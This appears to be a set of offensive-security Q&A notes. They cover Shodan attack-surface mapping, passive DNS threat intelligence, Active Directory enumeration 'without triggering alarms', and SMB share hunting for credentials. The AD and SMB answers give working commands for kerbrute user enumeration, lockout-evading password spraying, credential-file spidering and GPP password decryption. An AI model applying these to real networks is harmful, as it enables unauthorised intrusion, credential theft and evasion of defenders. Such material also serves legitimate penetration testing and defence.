Shodan attack surface mapping: (1) Organisation search -- org:'Target Corporation' returns all internet-facing assets registered to the org; combine with ssl:'target.com' to find assets by SSL cert. (2) ASN search -- search net:203.0.113.0/24 or asn:AS12345 for all assets in their IP range. (3) Port-specific queries -- org:'Target' port:22 (SSH); port:3389 (RDP -- should not be internet-facing); port:5900 (VNC); port:27017 (MongoDB -- check if auth required); port:6379 (Redis -- commonly unauthenticated); port:9200 (Elasticsearch -- often open with no auth); port:2375 (Docker API -- unauthenticated remote code execution). (4) Product-specific -- product:'Apache httpd' org:'Target'; product:'Microsoft IIS httpd' version:'6.0' (EOL). (5) Vulnerability search -- vuln:CVE-2021-44228 org:'Target' (Log4Shell exposed hosts); vuln:CVE-2019-0708 (BlueKeep). (6) SSL/TLS -- ssl.cert.expired:true org:'Target'; ssl.cert.subject.cn:'*.target.com'. (7) Headers -- http.title:'phpmyadmin' org:'Target'; http.html:'wp-login.php' org:'Target'. (8) Historical data -- Shodan history API shows how the attack surface changed over time. (9) Shodan Monitor -- automated alerts when new hosts appear on target ASN/IP range. Use Censys as complement -- more complete IPv4 coverage, better cert data; FOFA for Asian infrastructure.
How do you enumerate Active Directory without triggering alarms?

Stealthy AD enumeration techniques: (1) LDAP enumeration -- any authenticated domain user can query LDAP; ldapsearch -x -H ldap://DC -D 'user@domain.com' -w 'pass' -b 'DC=domain,DC=com' '(objectClass=user)' or PowerView Get-ADUser. Low noise, appears as normal LDAP traffic. (2) BloodHound collection -- SharpHound.exe --CollectionMethod DCOnly uses only LDAP/S to DC (no lateral movement); avoids touching workstations. DCOnly is stealthy; All collection method generates SMB connections to every host. (3) LDAP queries mimicking legitimate tools -- Microsoft AD Users and Computers (dsa.msc) generates the same LDAP queries; blend in. (4) DNS enumeration -- Resolve-DnsName, nslookup _kerberos._tcp.domain.com (SRV records reveal DCs), _ldap._tcp.dc._msdcs.domain.com. (5) SMB null sessions -- check for null session on DC (legacy): smbclient -N -L //DC. (6) Kerbrute user enumeration -- validates domain usernames by sending AS-REQ without credentials; valid users get KRB5KDC_ERR_PREAUTH_REQUIRED, invalid get KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN; generates Kerberos traffic only, no failed logon events for non-existent users. (7) Spray timing -- one password attempt per user per 30 minutes to stay below lockout threshold; use DomainPasswordSpray.ps1 or kerbrute spray. (8) SAMR enumeration -- avoid SamQueryInformationUser calls (detected); prefer LDAP. (9) Time queries to business hours -- off-hours enumeration is anomalous.
Explain passive DNS analysis for threat intelligence and attack mapping.

Passive DNS (pDNS) records historical DNS resolution data collected from recursive resolvers. Use cases: (1) Infrastructure mapping -- given a malware C2 IP, query pDNS to find all domains that resolved to it historically; reveals other C2 domains from the same campaign (pivoting). (2) Domain history -- a domain registered last week claiming to be 'paypal-secure.com' is suspicious; pDNS shows no historical resolution = newly registered malicious domain. (3) Bulletproof hosting detection -- IPs that host hundreds of different domains in a short period are abuse-friendly hosting providers. (4) Fast flux detection -- domain's A record changes every 5 minutes (different IPs from a botnet acting as proxies); pDNS shows many IPs for the same domain in a short time window. (5) Campaign correlation -- shared NS records, registrant email, or SSL cert Subject Alternative Names link related malicious infrastructure. (6) Subdomain takeover discovery -- historical CNAME pointing to a defunct cloud service (Fastly, Heroku, GitHub Pages) that can now be claimed. Tools and APIs: SecurityTrails (richest pDNS API), RiskIQ/PassiveTotal (owned by Microsoft, strong correlation tools), CIRCL pDNS (free, European resolver data), Farsight DNSDB (largest global pDNS dataset), VirusTotal Relations tab. Query structure: ip:1.2.3.4 in SecurityTrails shows all domains that ever resolved to that IP.
How do you enumerate SMB shares and find sensitive data efficiently?

SMB enumeration pipeline: (1) Discover SMB hosts -- nmap -p 445 --open 10.0.0.0/24 or masscan -p 445 10.0.0.0/24 --rate 1000. (2) Enumerate shares -- smbclient -L //host -N (null session); smbmap -H host -u guest (guest session); smbmap -H host -d domain -u user -p pass (auth); CrackMapExec smb 10.0.0.0/24 -u user -p pass --shares. (3) Check permissions -- smbmap shows R/W per share; READ allows data exfiltration, WRITE enables payload deployment. (4) Spider for sensitive files -- smbmap -H host -u user -p pass -R SHARENAME --depth 5; spider_plus module in CrackMapExec indexes all files with metadata (name, size, mtime). grep for: password, credential, secret, aws_key, id_rsa,.pfx,.p12, KeePass,.kdbx, web.config, appsettings.json,.env. (5) Access -- smbclient //host/share -U domain/user%pass; get file.txt; mget *.config. (6) Sensitive locations -- SYSVOL share: look for Group Policy Preferences XML with cpassword (GPP credentials -- AES key is published by Microsoft, decrypt with gpp-decrypt); NETLOGON for logon scripts with credentials; backup shares for DB dumps, config files.
